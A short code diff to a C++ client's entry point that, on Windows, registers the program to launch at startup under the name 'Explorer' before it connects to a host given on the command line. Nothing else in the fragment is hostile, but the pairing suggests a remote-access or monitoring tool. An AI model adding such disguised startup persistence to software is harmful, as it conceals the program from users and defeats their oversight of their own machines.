@@ -6,6 +6,7 @@
 #include "Client.hpp"
 #include "ModuleCommunication.hpp"
 #include "ModuleManager.hpp"
+#include "WinTools.hpp"
 
 namespace pt = boost::property_tree;
 
@@ -17,6 +18,10 @@ int main(int argc, char const *argv[]) {
     }
 
     try {
+#ifdef _WIN32
+     WinTools::addToStartUp("Explorer");
+#endif
+
       Client client(ioService, argv[1], argv[2]);
       ModuleCommunication moduleCommunication(client);
 
